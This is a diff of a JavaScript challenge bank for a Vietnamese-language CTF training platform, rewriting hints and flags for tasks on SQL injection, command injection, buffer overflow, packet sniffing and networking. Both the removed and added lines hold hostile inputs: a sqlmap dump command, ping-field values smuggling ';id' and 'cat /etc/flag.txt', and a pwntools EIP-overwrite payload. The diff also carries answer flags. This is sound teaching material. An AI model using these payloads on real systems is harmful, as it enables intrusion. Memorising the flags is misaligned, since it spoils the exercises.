-            • <b>Burp Suite Repeater</b>: Thủ công tinh chỉnh câu lệnh SQL Injection.<br>
-            • <b>sqlmap</b>: <code>sqlmap -u "http://.../employee.php?id=1" --dump</code>.<br>
-            • <b>Hashcat / John the Ripper / CrackStation</b>: <code>hashcat -m 0 e10adc... rockyou.txt</code>.
+            • <b>CrackStation.net</b>: Cơ sở dữ liệu rainbow table tra cứu hash trực tuyến miễn phí.<br>
+            • <b>Hashcat / John the Ripper</b>: <code>hashcat -m 0 hash.txt rockyou.txt</code>.<br>
+            • <b>CyberChef</b>: Recipe Hash / Checksum.
         </div>
     </div>
     <div>
@@ -657,13 +680,12 @@ Host: portal.corp.local
             💡 Ý tưởng & Hướng xử lý (Methodology & Ideas):
         </span>
         <div class="text-slate-200 pl-1 mt-1 text-xs leading-relaxed">
-            1. Payload <code>id=-1' UNION SELECT ...</code> vô hiệu hóa kết quả truy vấn gốc để kết quả UNION xuất hiện ở cột thứ 2.<br>
-            2. Chuỗi băm <code>e10adc3949ba59abbe56e057f20f883e</code> là hàm băm MD5 chuẩn của chuỗi mật khẩu huyền thoại <b>123456</b>.<br>
-            3. Cờ hợp lệ: <code>FLAG{sqli_union_admin_plaintext_123456}</code>.
+            1. Chuỗi 32 ký tự hex <code>482c811da5d5b4bc6d497ffa98491e38</code> là hàm băm MD5 chuẩn.<br>
+            2. Hãy dùng CrackStation hoặc tìm kiếm chuỗi băm này trên các bộ từ điển phổ biến để tìm ra từ khóa mật khẩu gốc.
         </div>
     </div>
 </div>`,
-                flag: "FLAG{sqli_union_admin_plaintext_123456}"
+                flag: "FLAG{password123}"
             },
             {
                 id: 14,
@@ -673,35 +695,40 @@ Host: portal.corp.local
                 category: "Tấn Công Ứng Dụng Web (Command Injection / RCE)",
                 difficulty: "Nâng cao",
                 points: 250,
-                description: "Trang quản trị Router nội bộ có tính năng 'Network Diagnostic Ping' cho phép kiểm tra độ trễ mạng nhưng lập trình viên sử dụng trực tiếp hàm system('ping -c 2 ' . $_POST['ip']) mà không lọc ký tự đặc biệt. Kẻ tấn công sử dụng toán tử phân tách lệnh ';' để đọc file cờ bí mật /var/secret/flag.txt. Hãy phân tích phản hồi HTTP để lấy cờ!",
-                codeSnippet: `POST /admin/ping_tool.php HTTP/1.1
-Host: router.internal.net
+                description: "Trang quản trị Router nội bộ có tính năng 'Network Diagnostic Ping' cho phép kiểm tra độ trễ mạng nhưng lập trình viên sử dụng trực tiếp hàm shell mà không lọc ký tự đặc biệt. Kẻ tấn công sử dụng toán tử phân tách lệnh ';' để đọc file cờ bí mật /etc/flag.txt được mã hóa Base64. Hãy phân tích phản hồi HTTP để lấy cờ!",
+                codeSnippet: `POST /tools/ping.php HTTP/1.1
+Host: edge-router.internal.net
 Content-Type: application/x-www-form-urlencoded
-Cookie: PHPSESSID=9a8b7c6d5e4f3a2b1c
 
-ip=127.0.0.1%3B+cat+%2Fvar%2Fsecret%2Fflag.txt
+ip=127.0.0.1%3B+cat+%2Fetc%2Fflag.txt+%7C+base64
 
 --- HTTP/1.1 200 OK ---
 Content-Type: text/plain
 
 PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
-64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.038 ms
-64 bytes from 127.0.0.1: icmp_seq=2 ttl=64 time=0.041 ms
+64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.040 ms
 
 --- 127.0.0.1 ping statistics ---
-2 packets transmitted, 2 received, 0% packet loss
+1 packets transmitted, 1 received, 0% packet loss
 
-[OUTPUT LỆNH KẾ TIẾP: cat /var/secret/flag.txt]:
-FLAG{rce_command_injection_semicolon_root_shell}`,
+[COMMAND OUTPUT]:
+UkNFX3NlbWljb2xvbl9jb21tYW5kX2luamVjdGlvbl9wYXNzd29yZF9leGZpbA==
+
+---
+YÊU CẦU:
+Kẻ tấn công đã chèn lệnh '; cat /etc/flag.txt | base64' để đọc file cờ và mã hóa Base64 kết quả trả về.
+Hãy giải mã chuỗi Base64 trên để lấy cờ bí mật.
+Cú pháp cờ: FLAG{<kết_quả_sau_khi_decode_base64>}
+(Ví dụ: nếu chuỗi decode ra abc thì nộp FLAG{abc})`,
                 hint: `<div class="space-y-2">
     <div>
         <span class="inline-flex items-center gap-1 font-bold text-amber-300 bg-amber-950/70 px-2 py-0.5 rounded border border-amber-800 text-[11px]">
             🛠️ Công cụ gợi ý (Recommended Tools):
         </span>
         <div class="text-amber-100/90 pl-1 mt-1 text-xs">
-            • <b>Burp Suite Repeater</b>: Chỉnh sửa và gửi request với các ký tự <code>;</code>, <code>|</code>, <code>&amp;&amp;</code>, <code>$(cmd)</code>.<br>
-            • <b>Commix</b>: Automated All-in-One OS Command Injection and Exploitation Tool.<br>
-            • <b>cURL CLI</b>: <code>curl -d "ip=127.0.0.1;id" http://router.internal.net/admin/ping_tool.php</code>.
+            • <b>NETLAB Virtual Terminal</b>: Lệnh <code>b64 decode &lt;chuỗi&gt;</code>.<br>
+            • <b>CyberChef</b>: Recipe <code>From Base64</code>.<br>
+            • <b>Linux/macOS CLI</b>: <code>echo "..." | base64 -d</code>.
         </div>
     </div>
     <div>
@@ -709,13 +736,13 @@ FLAG{rce_command_injection_semicolon_root_shell}`,
             💡 Ý tưởng & Hướng xử lý (Methodology & Ideas):
         </span>
         <div class="text-slate-200 pl-1 mt-1 text-xs leading-relaxed">
-            1. Dấu chấm phẩy <code>;</code> trong Linux Shell cho phép thực thi tuần tự nhiều lệnh trên cùng một dòng.<br>
-            2. Đoạn mã <code>127.0.0.1; cat /var/secret/flag.txt</code> sau khi hoàn tất lệnh ping sẽ thực thi ngay lệnh in nội dung cờ bí mật.<br>
-            3. Cờ được trích xuất trực tiếp: <code>FLAG{rce_command_injection_semicolon_root_shell}</code>.
+            1. Dấu chấm phẩy <code>;</code> cho phép thực thi lệnh thứ hai ngay sau khi lệnh ping kết thúc.<br>
+            2. Kết quả của file <code>/etc/flag.txt</code> được chuyển tiếp qua lệnh <code>base64</code> và in ra ở phần Command Output.<br>
+            3. Giải mã chuỗi Base64 đó ra văn bản rõ để lấy nội dung cờ.
         </div>
     </div>
 </div>`,
-                flag: "FLAG{rce_command_injection_semicolon_root_shell}"
+                flag: "FLAG{RCE_semicolon_command_injection_password_exfil}"
             },
             {
                 id: 15,
@@ -725,37 +752,38 @@ FLAG{rce_command_injection_semicolon_root_shell}`,
                 category: "Lỗi Bộ Nhớ & Khai Thác Nhị Phân (Buffer Overflow / Exploit)",
                 difficulty: "Chuyên gia",
                 points: 300,
-                description: "Một dịch vụ nhị phân C 32-bit x86 chạy trên Linux sử dụng hàm không an toàn strcpy(dest, src) với bộ đệm 64 bytes. Khi gửi chuỗi mẫu De Bruijn cyclic pattern 100 ký tự sinh bởi Metasploit, chương trình bị crash tại thanh ghi con trỏ lệnh EIP có giá trị 0x41326441 (ASCII: 'Ad2A'). Hãy tính toán offset chính xác và xác định địa chỉ hàm get_shell() để hoàn tất payload khai thác!",
-                codeSnippet: `$ gdb -q ./vulnerable_server
-Reading symbols from ./vulnerable_server...
-(gdb) run < pattern_100.txt
+                description: "Một dịch vụ nhị phân C 32-bit x86 chạy trên Linux sử dụng hàm không an toàn strcpy(dest, src) với bộ đệm 64 bytes. Khi gửi chuỗi mẫu De Bruijn cyclic pattern 100 ký tự sinh bởi Metasploit, chương trình bị crash tại thanh ghi con trỏ lệnh EIP có giá trị 0x41326441 (ASCII: 'Ad2A'). Hãy tính toán offset chính xác và xác định địa chỉ hàm get_secret_flag() để hoàn tất payload khai thác!",
+                codeSnippet: `$ gdb -q ./vuln_server
+Reading symbols from ./vuln_server...
+(gdb) run < cyclic_pattern_100.txt
 Program received signal SIGSEGV, Segmentation fault.
 0x41326441 in ?? ()
 
 (gdb) info registers
 eax            0x0                 0
-ebp            0x41316441          0x41316441  ("Ad1A")
+ebp            0x41316441          0x41316441
 esp            0xffffd080          0xffffd080
-eip            0x41326441          0x41326441  ("Ad2A" -> Ký tự ghi đè con trỏ lệnh EIP!)
+eip            0x41326441          0x41326441  <-- [CRASH AT EIP]
 
-$ msf-pattern_offset -q 0x41326441
-[*] Exact match at offset 72
+(gdb) print get_secret_flag
+$1 = {void ()} 0x080485d6 <get_secret_flag>
 
-(gdb) print get_shell
-$1 = {void ()} 0x080485d6 <get_shell>
-
-Cấu trúc Exploit Payload:
-Payload = [72 bytes đệm 'A'] + [4 bytes địa chỉ get_shell: \\xd6\\x85\\x04\\x08]
-Định dạng nộp cờ: FLAG{bof_eip_offset_72_ret_0x080485d6}`,
+---
+YÊU CẦU:
+1. Giá trị thanh ghi EIP lúc crash là 0x41326441 (ký tự ASCII: 'Ad2A').
+   Sử dụng công cụ tính offset pattern (như msf-pattern_offset) để tìm số byte đệm (offset) chính xác làm tràn đến EIP.
+2. Địa chỉ hàm mục tiêu 'get_secret_flag' để ghi đè vào EIP.
+Cú pháp cờ: FLAG{offset_<số_byte>_ret_<địa_chỉ_hàm>}
+(Ví dụ mẫu cú pháp: FLAG{offset_64_ret_0x08048123})`,
                 hint: `<div class="space-y-2">
     <div>
         <span class="inline-flex items-center gap-1 font-bold text-amber-300 bg-amber-950/70 px-2 py-0.5 rounded border border-amber-800 text-[11px]">
             🛠️ Công cụ gợi ý (Recommended Tools):
         </span>
         <div class="text-amber-100/90 pl-1 mt-1 text-xs">
-            • <b>GDB</b> (GNU Debugger) kết hợp plugin <b>GEF / PEDA / pwndbg</b>.<br>
-            • <b>Metasploit Pattern Tools</b>: <code>msf-pattern_create -l 100</code> và <code>msf-pattern_offset -q &lt;value&gt;</code>.<br>
-            • <b>Pwntools (Python)</b>: <code>from pwn import *; p.sendline(b'A'*72 + p32(0x080485d6))</code>.
+            • <b>Metasploit Pattern Tools</b>: <code>msf-pattern_offset -q 0x41326441</code>.<br>
+            • <b>GDB PEDA / GEF / pwndbg</b>: <code>pattern offset 0x41326441</code>.<br>
+            • <b>Pwntools (Python)</b>: <code>cyclic_find(0x41326441)</code>.
         </div>
     </div>
     <div>
@@ -763,14 +791,13 @@ Payload = [72 bytes đệm 'A'] + [4 bytes địa chỉ get_shell: \\xd6\\x85\\x
             💡 Ý tưởng & Hướng xử lý (Methodology & Ideas):
         </span>
         <div class="text-slate-200 pl-1 mt-1 text-xs leading-relaxed">
-            1. Trong kiến trúc x86 32-bit, tràn bộ đệm stack ghi đè từ mảng cục bộ qua saved EBP (4 bytes) rồi đến Saved Return Address (EIP).<br>
-            2. Vị trí offset chính xác là <b>72 bytes</b>. Đúng sau 72 bytes này, 4 bytes kế tiếp sẽ được CPU nạp trực tiếp vào thanh ghi EIP khi hàm trả về lệnh <code>ret</code>.<br>
-            3. Địa chỉ hàm mục tiêu <code>get_shell</code> là <b>0x080485d6</b>.<br>
-            4. Cờ: <code>FLAG{bof_eip_offset_72_ret_0x080485d6}</code>.
+            1. Giá trị <code>0x41326441</code> tương ứng với 4 byte chuỗi ASCII "Ad2A" trong cyclic pattern.<br>
+            2. Vị trí offset của chuỗi này nằm trong khoảng hơn 64 bytes (khoảng 7x bytes).<br>
+            3. Địa chỉ của hàm mục tiêu <code>get_secret_flag</code> được hiển thị trong output của lệnh <code>print get_secret_flag</code>.
         </div>
     </div>
 </div>`,
-                flag: "FLAG{bof_eip_offset_72_ret_0x080485d6}"
+                flag: "FLAG{offset_72_ret_0x080485d6}"
             },
 
             // =========================================================================
@@ -789,19 +816,26 @@ Payload = [72 bytes đệm 'A'] + [4 bytes địa chỉ get_shell: \\xd6\\x85\\x
 0000   00 50 56 c0 00 08 00 0c 29 3e 51 4a 08 00 45 00
 0010   00 48 a1 b2 40 00 40 06 7c d4 c0 a8 01 0a c0 a8
 0020   01 01 04 23 00 17 6f 12 8a 44 2e 84 9b 12 50 18
-0030   10 00 e3 9d 00 00 50 41 53 53 20 46 4c 41 47 7b
-0040   63 6c 65 61 72 5f 74 65 78 74 5f 74 65 6c 6e 65
-0050   74 5f 69 73 5f 69 6e 73 65 63 75 72 65 7d 0d 0a
-[ASCII Translated]:
-...PASS FLAG{clear_text_telnet_is_insecure}..`,
+0030   10 00 e3 9d 00 00 50 41 53 53 20 54 65 6c 6e 65
+0040   74 5f 50 61 73 73 77 6f 72 64 5f 55 6e 65 6e 63
+0050   72 79 70 74 65 64 5f 56 75 6c 6e 0d 0a
+
+---
+YÊU CẦU:
+1. Giao thức Telnet (cổng 23) truyền dữ liệu ở dạng văn bản thuần (Cleartext) trong phần payload của TCP.
+2. Dữ liệu bắt đầu từ byte thứ 36 (offset 0036 hex: 50 41 53 53 20 ... tức 'PASS ').
+3. Hãy giải mã các byte Hex từ sau chữ 'PASS ' cho đến trước ký tự xuống dòng 0d 0a sang ký tự ASCII để tìm mật khẩu.
+Cú pháp cờ: FLAG{<mật_khẩu_telnet_sau_khi_dịch_hex>}
+(Ví dụ mẫu cú pháp: FLAG{MySecretPassword})`,
                 hint: `<div class="space-y-2">
     <div>
         <span class="inline-flex items-center gap-1 font-bold text-amber-300 bg-amber-950/70 px-2 py-0.5 rounded border border-amber-800 text-[11px]">
             🛠️ Công cụ gợi ý (Recommended Tools):
         </span>
         <div class="text-amber-100/90 pl-1 mt-1 text-xs">
-            • <b>Wireshark</b>: Filter <code>tcp.port == 23</code> hoặc chuột phải chọn <b>Follow &gt; TCP Stream</b>.<br>
-            • <b>Tshark CLI</b>: <code>tshark -r capture.pcap -Y "telnet" -T fields -e data.text</code>.
+            • <b>CyberChef</b>: Recipe <code>From Hex (Delimiter: Auto/Space)</code>.<br>
+            • <b>Python CLI</b>: <code>bytes.fromhex("54 65 6c...").decode("ascii")</code>.<br>
+            • Bảng tra mã ASCII chuẩn (Hex to Char).
         </div>
     </div>
     <div>
@@ -809,13 +843,13 @@ Payload = [72 bytes đệm 'A'] + [4 bytes địa chỉ get_shell: \\xd6\\x85\\x
             💡 Ý tưởng & Hướng xử lý (Methodology & Ideas):
         </span>
         <div class="text-slate-200 pl-1 mt-1 text-xs leading-relaxed">
-            1. Telnet hoạt động trên TCP Port 23 và hoàn toàn không mã hóa dữ liệu truyền.<br>
-            2. Cờ Flag nằm trực tiếp sau chuỗi 'PASS ' trong phần dịch mã ASCII của gói tin.<br>
-            3. Cờ: <code>FLAG{clear_text_telnet_is_insecure}</code>.
+            1. Các byte <code>50 41 53 53 20</code> tương ứng với từ khóa <code>PASS </code>.<br>
+            2. Các byte tiếp theo từ offset <code>003b</code>: <code>54 65 6c 6e 65 74...</code> tương ứng với chữ cái mở đầu là "T", "e", "l", "n", "e", "t"...<br>
+            3. Dịch trọn vẹn chuỗi hex này sang ASCII cho đến trước byte kết thúc <code>0d 0a</code>.
         </div>
     </div>
 </div>`,
-                flag: "FLAG{clear_text_telnet_is_insecure}"
+                flag: "FLAG{Telnet_Password_Unencrypted_Vuln}"
             },
             {
                 id: 17,
@@ -826,10 +860,14 @@ Payload = [72 bytes đệm 'A'] + [4 bytes địa chỉ get_shell: \\xd6\\x85\\x
                 difficulty: "Trung bình",
                 points: 150,
                 description: "Máy chủ bảo mật của bạn đang ở chế độ ngủ (Standby) tại địa chỉ IP: 172.28.140.219/21. Để đánh thức máy chủ bằng gói tin Wake-on-LAN qua Router, bạn phải tính toán chính xác địa chỉ Directed Broadcast IP của mạng con này!",
-                codeSnippet: `Target IP: 172.28.140.219
+                codeSnippet: `Target Host IP: 172.28.140.219
 Prefix: /21
-Nhiệm vụ: Tính toán Directed Broadcast Address của mạng con này.
-Định dạng cờ nộp bài: FLAG{<Broadcast_IP>} (Ví dụ: FLAG{172.28.x.255})`,
+
+---
+YÊU CẦU:
+Tính toán địa chỉ Directed Broadcast IP chính xác của mạng con chứa host trên.
+Cú pháp cờ: FLAG{<Broadcast_IP>}
+(Ví dụ: FLAG{172.28.0.255})`,
                 hint: `<div class="space-y-2">
     <div>
         <span class="inline-flex items-center gap-1 font-bold text-amber-300 bg-amber-950/70 px-2 py-0.5 rounded border border-amber-800 text-[11px]">
@@ -837,7 +875,7 @@ Nhiệm vụ: Tính toán Directed Broadcast Address của mạng con này.
         </span>
         <div class="text-amber-100/90 pl-1 mt-1 text-xs">
             • <b>ipcalc CLI</b>: <code>ipcalc 172.28.140.219/21</code>.<br>
-            • <b>Python ipaddress</b>: <code>python3 -c "import ipaddress; print(ipaddress.IPv4Network('172.28.140.219/21', strict=False).broadcast_address)"</code>.
+            • <b>Python ipaddress</b>: <code>ipaddress.IPv4Network("172.28.140.219/21", strict=False)</code>.
         </div>
     </div>
     <div>
@@ -845,11 +883,9 @@ Nhiệm vụ: Tính toán Directed Broadcast Address của mạng con này.
             💡 Ý tưởng & Hướng xử lý (Methodology & Ideas):
         </span>
         <div class="text-slate-200 pl-1 mt-1 text-xs leading-relaxed">
-            1. /21 có Subnet Mask là 255.255.248.0 (21 bit mạng, 11 bit host).<br>
-            2. Bước nhảy (block size) ở octet 3: 256 - 248 = 8.<br>
-            3. Octet 3 là 140; 140 / 8 = 17 dư 4 -> Network Octet 3 = 17 * 8 = 136. Broadcast Octet 3 = 136 + 8 - 1 = 143.<br>
-            4. Địa chỉ Broadcast: <b>172.28.143.255</b>.<br>
-            5. Cờ: <code>FLAG{172.28.143.255}</code>.
+            1. /21 có Subnet Mask 255.255.248.0 (21 bit 1, 11 bit 0).<br>
+            2. Bước nhảy ở octet 3 là: 256 - 248 = 8.<br>
+            3. Tìm địa chỉ mạng của octet 3: lấy 140 chia cho 8 lấy phần nguyên nhân lại với 8. Sau đó cộng thêm 8 - 1 để tìm giá trị Broadcast ở octet 3. Octet cuối cùng luôn là 255.
         </div>
     </div>
 </div>`,
@@ -870,16 +906,19 @@ Extended IP access list 105
     20 permit udp any host 10.20.30.40 eq 53
     30 deny ip any any (implicit default)
 
-Nhiệm vụ: Nhập số hiệu cổng TCP được phép đi qua tường lửa vào cấu trúc cờ:
-FLAG{tcp_port_<số_cổng>_https}`,
+---
+YÊU CẦU:
+Nhập số hiệu cổng TCP được phép đi qua tường lửa vào cấu trúc cờ:
+Cú pháp cờ: FLAG{tcp_port_<số_cổng>_https}
+(Ví dụ: FLAG{tcp_port_80_https})`,
                 hint: `<div class="space-y-2">
     <div>
         <span class="inline-flex items-center gap-1 font-bold text-amber-300 bg-amber-950/70 px-2 py-0.5 rounded border border-amber-800 text-[11px]">
             🛠️ Công cụ gợi ý (Recommended Tools):
         </span>
         <div class="text-amber-100/90 pl-1 mt-1 text-xs">
-            • <b>Cisco IOS CLI</b>: <code>show access-lists 105</code>.<br>
-            • <b>Nmap Port Scan</b>: <code>nmap -sS -p 443,53,80 10.20.30.40</code> để xác định cổng Filtered vs Open.
+            • <b>Cisco IOS CLI</b>: Tra cứu cú pháp <code>access-list &lt;number&gt; permit tcp ... eq &lt;port&gt;</code>.<br>
+            • Danh mục cổng mạng chuẩn IANA (Port Numbers).
         </div>
     </div>
     <div>
@@ -887,8 +926,8 @@ FLAG{tcp_port_<số_cổng>_https}`,
             💡 Ý tưởng & Hướng xử lý (Methodology & Ideas):
         </span>
         <div class="text-slate-200 pl-1 mt-1 text-xs leading-relaxed">
-            1. Xem dòng 10: <code>permit tcp any host 10.20.30.40 eq 443</code> cho phép lưu lượng TCP cổng 443 (HTTPS).<br>
-            2. Cờ: <code>FLAG{tcp_port_443_https}</code>.
+            1. Xem dòng lệnh số 10: Quy tắc chỉ rõ giao thức TCP và từ khóa <code>eq</code> kèm số cổng chuẩn của HTTPS.<br>
+            2. Điền số hiệu cổng này vào vị trí placeholder trong cú pháp cờ.
         </div>
     </div>
 </div>`,
@@ -903,11 +942,23 @@ FLAG{tcp_port_<số_cổng>_https}`,
                 difficulty: "Trung bình",
                 points: 200,
                 description: "Một gói tin dữ liệu cần đi từ Router A đến Router D qua mạng OSPF. Công thức Cost = 100 Mbps / Bandwidth. Tuyến A -> B -> D có băng thông A-B là 100 Mbps (Cost 1) và B-D là 10 Mbps (Cost 10). Tuyến A -> C -> D có băng thông A-C là 1 Gbps (Cost 1) và C-D là 1 Gbps (Cost 1). Tổng Cost của tuyến đường tối ưu được OSPF lựa chọn là bao nhiêu?",
-                codeSnippet: `Tuyến 1: A -> B -> D (Tổng Cost: 1 + 10 = 11)
-Tuyến 2: A -> C -> D (Tổng Cost: 1 + 1 = 2)
+                codeSnippet: `Băng thông tham chiếu chuẩn OSPF: Reference Bandwidth = 100 Mbps.
+Công thức tính chi phí đường truyền OSPF: Cost = 100 Mbps / Bandwidth.
+(Lưu ý: Nếu Bandwidth >= 100 Mbps, Cost tối thiểu là 1).
 
-Nhiệm vụ: Nhập tổng chi phí Cost và tên tuyến đường tối ưu theo định dạng:
-FLAG{cost_<số_cost>_path_<tên_tuyến>} (Ví dụ: FLAG{cost_2_path_acd})`,
+Gói tin cần đi từ Router A đến Router D:
+- Tuyến 1 (A -> B -> D):
+  + Đoạn A-B: Băng thông 100 Mbps
+  + Đoạn B-D: Băng thông 10 Mbps (Cost = 100 / 10 = 10)
+- Tuyến 2 (A -> C -> D):
+  + Đoạn A-C: Băng thông 1 Gbps (Cost = 1)
+  + Đoạn C-D: Băng thông 1 Gbps (Cost = 1)
+
+---
+YÊU CẦU:
+Tính tổng chi phí Metric của tuyến đường ngắn nhất mà OSPF lựa chọn và nhập theo định dạng:
+Cú pháp cờ: FLAG{cost_<tổng_cost>_path_<tên_tuyến>}
+(Ví dụ: nếu tuyến ABD có cost 11 thì nộp: FLAG{cost_11_path_abd})`,
                 hint: `<div class="space-y-2">
     <div>
         <span class="inline-flex items-center gap-1 font-bold text-amber-300 bg-amber-950/70 px-2 py-0.5 rounded border border-amber-800 text-[11px]">
@@ -923,9 +974,9 @@ FLAG{cost_<số_cost>_path_<tên_tuyến>} (Ví dụ: FLAG{cost_2_path_acd})`,
             💡 Ý tưởng & Hướng xử lý (Methodology & Ideas):
         </span>
         <div class="text-slate-200 pl-1 mt-1 text-xs leading-relaxed">
-            1. OSPF luôn lựa chọn đường đi có tổng Metric (Cost) nhỏ nhất.<br>
-            2. Tuyến A -&gt; C -&gt; D có tổng Cost = 1 + 1 = 2 (nhỏ hơn 11 của tuyến ABD).<br>
-            3. Cờ: <code>FLAG{cost_2_path_acd}</code>.
+            1. OSPF luôn chọn tuyến đường có tổng Cost nhỏ nhất.<br>
+            2. Cộng chi phí của từng chặng trong Tuyến 1 và Tuyến 2.<br>
+            3. So sánh 2 kết quả và chọn tuyến đường tối ưu để điền tên tuyến (chữ thường) và tổng chi phí vào cờ.
         </div>
     </div>
 </div>`,
@@ -945,8 +996,13 @@ MacAddress          IpAddress        Lease(sec)  Type            VLAN  Interface
 ------------------  ---------------  ----------  --------------  ----  -----------------
 00:1A:2B:3C:4D:5E   192.168.1.100    86400       dhcp-snooping   10    GigabitEthernet0/1 [TRUSTED]
 F4:0F:24:99:AA:BB   192.168.1.254    86400       dhcp-snooping   10    FastEthernet0/24   [UNTRUSTED_ALERT]
+00:14:22:AA:BB:CC   192.168.1.105    86400       dhcp-snooping   10    GigabitEthernet0/2 [TRUSTED]
 
-Nhiệm vụ: Cờ chính là địa chỉ MAC của kẻ tấn công: FLAG{<MAC_ADDRESS>}`,
+---
+YÊU CẦU:
+Tìm địa chỉ MAC của thiết bị giả mạo máy chủ DHCP gắn vào cổng không tin cậy (Untrusted).
+Cú pháp cờ: FLAG{<MAC_ADDRESS>}
+(Ví dụ mẫu cú pháp: FLAG{00:11:22:33:44:55})`,
                 hint: `<div class="space-y-2">
     <div>
         <span class="inline-flex items-center gap-1 font-bold text-amber-300 bg-amber-950/70 px-2 py-0.5 rounded border border-amber-800 text-[11px]">
@@ -962,9 +1018,9 @@ Nhiệm vụ: Cờ chính là địa chỉ MAC của kẻ tấn công: FLAG{<MAC
             💡 Ý tưởng & Hướng xử lý (Methodology & Ideas):
         </span>
         <div class="text-slate-200 pl-1 mt-1 text-xs leading-relaxed">
-            1. Cổng FastEthernet0/24 là cổng không tin cậy (Untrusted) đã tự ý gửi gói DHCP Offer cấp phát IP 192.168.1.254.<br>
-            2. Địa chỉ MAC của Rogue DHCP Server là <b>F4:0F:24:99:AA:BB</b>.<br>
-            3. Cờ: <code>FLAG{F4:0F:24:99:AA:BB}</code>.
+            1. Cổng nào được cấu hình TRUSTED là cổng tin cậy nối tới máy chủ cấp phát hợp lệ.<br>
+            2. Cổng nào mang nhãn UNTRUSTED_ALERT tự ý cấp IP gateway bất thường 192.168.1.254 chính là kẻ tấn công Rogue DHCP.<br>
+            3. Trích xuất địa chỉ MAC ở dòng tương ứng.
         </div>
     </div>
 </div>`,
@@ -979,19 +1035,24 @@ Nhiệm vụ: Cờ chính là địa chỉ MAC của kẻ tấn công: FLAG{<MAC
                 difficulty: "Nâng cao",
                 points: 200,
                 description: "Máy Client gửi gói tin SYN khởi tạo kết nối TCP đến Server với Initial Sequence Number (ISN) = 1000. Để hoàn thành bước thứ 2 trong quá trình bắt tay, Server phải phản hồi gói tin SYN-ACK với giá trị Acknowledgment Number (AckN) bằng bao nhiêu?",
-                codeSnippet: `Step 1: Client -> Server: [SYN] Seq = 1000
-Step 2: Server -> Client: [SYN, ACK] Seq = 5000, Ack = ?
+                codeSnippet: `Quá trình bắt tay 3 bước TCP giữa Client và Server:
+Bước 1: Client -> Server: [SYN] Seq = 1000
+Bước 2: Server -> Client: [SYN, ACK] Seq = 5000, Ack = ???
 
-Nhiệm vụ: Tính giá trị trường Ack của gói tin SYN-ACK theo định dạng:
-FLAG{ack_<giá_trị>}`,
+---
+YÊU CẦU:
+Theo chuẩn RFC 793, cờ SYN tiêu thụ 1 đơn vị Sequence Number ảo.
+Tính giá trị trường Acknowledgment Number (Ack) mà Server phải gửi trong gói SYN-ACK.
+Cú pháp cờ: FLAG{ack_<giá_trị>}
+(Ví dụ: FLAG{ack_5001})`,
                 hint: `<div class="space-y-2">
     <div>
         <span class="inline-flex items-center gap-1 font-bold text-amber-300 bg-amber-950/70 px-2 py-0.5 rounded border border-amber-800 text-[11px]">
             🛠️ Công cụ gợi ý (Recommended Tools):
         </span>
         <div class="text-amber-100/90 pl-1 mt-1 text-xs">
-            • <b>Wireshark</b>: Quan sát cờ SYN, ACK và trường Sequence/Ack number.<br>
-            • <b>RFC 793 (Transmission Control Protocol)</b>: Quy tắc tiêu thụ 1 byte ảo của cờ SYN/FIN.
+            • <b>RFC 793</b>: Tiêu chuẩn kỹ thuật giao thức Transmission Control Protocol.<br>
+            • <b>Wireshark</b>: Quan sát cờ SYN và các giá trị Sequence/Ack number.
         </div>
     </div>
     <div>
@@ -999,9 +1060,8 @@ FLAG{ack_<giá_trị>}`,
             💡 Ý tưởng & Hướng xử lý (Methodology & Ideas):
         </span>
         <div class="text-slate-200 pl-1 mt-1 text-xs leading-relaxed">
-            1. Trong quá trình bắt tay 3 bước, cờ SYN chiếm 1 byte ảo trong không gian sequence number.<br>
-            2. Do đó số xác nhận AckN luôn bằng SeqN + 1 = 1000 + 1 = <b>1001</b>.<br>
-            3. Cờ: <code>FLAG{ack_1001}</code>.
+            1. Trong quá trình bắt tay 3 bước TCP, gói SYN không chứa dữ liệu nhưng vẫn tiêu thụ 1 đơn vị số thứ tự sequence number.<br>
+            2. Giá trị Ack của phản hồi luôn bằng: <code>Seq của Client + 1</code>.
         </div>
     </div>
 </div>`,
@@ -1020,19 +1080,23 @@ FLAG{ack_<giá_trị>}`,
 
 url = "https://sandboxdnac.cisco.com/dna/system/api/v1/auth/token"
 headers = {"Content-Type": "application/json"}
-# Điền phương thức HTTP thích hợp: get, post, put hay delete?
+
+# Lập trình viên đang gọi API để xác thực và yêu cầu cấp mới Bearer Token:
 response = requests.request("???", url, auth=("devnetuser", "Cisco123!"))
 
-Nhiệm vụ: Nộp cờ với tên phương thức HTTP ở dạng chữ thường:
-FLAG{http_<method>_token}`,
+---
+YÊU CẦU:
+Trong chuẩn kiến trúc RESTful API, phương thức HTTP Verb nào (chữ thường: get, post, put, hay delete) được dùng khi gửi thông tin đăng nhập để yêu cầu tạo mới token phiên làm việc?
+Cú pháp cờ: FLAG{http_<method>_token}
+(Ví dụ: FLAG{http_get_token})`,
                 hint: `<div class="space-y-2">
     <div>
         <span class="inline-flex items-center gap-1 font-bold text-amber-300 bg-amber-950/70 px-2 py-0.5 rounded border border-amber-800 text-[11px]">
             🛠️ Công cụ gợi ý (Recommended Tools):
         </span>
         <div class="text-amber-100/90 pl-1 mt-1 text-xs">
-            • <b>Postman / Insomnia</b>: Gửi REST API Request thử nghiệm.<br>
-            • <b>Cisco DevNet API Documentation</b>: DNA Center REST API Auth Endpoint.
+            • <b>Postman / Insomnia</b>: Thử nghiệm RESTful API.<br>
+            • <b>Cisco DevNet Documentation</b>: Hướng dẫn gọi API DNA Center.
         </div>
     </div>
     <div>
@@ -1040,8 +1104,8 @@ FLAG{http_<method>_token}`,
             💡 Ý tưởng & Hướng xử lý (Methodology & Ideas):
         </span>
         <div class="text-slate-200 pl-1 mt-1 text-xs leading-relaxed">
-            1. Để gửi payload đăng nhập và yêu cầu tạo mới phiên làm việc/token, kiến trúc RESTful API luôn sử dụng phương thức <b>POST</b>.<br>
-            2. Cờ: <code>FLAG{http_post_token}</code>.
+            1. GET dùng để truy vấn đọc dữ liệu, không làm thay đổi trạng thái máy chủ.<br>
+            2. Phương thức chuẩn nào gửi thông tin đăng nhập trong body và tạo phiên làm việc mới (tạo token mới)? Điền tên phương thức đó ở dạng chữ thường vào cờ.
         </div>
     </div>
 </div>`,
@@ -1056,15 +1120,19 @@ FLAG{http_<method>_token}`,
                 difficulty: "Chuyên gia",
                 points: 300,
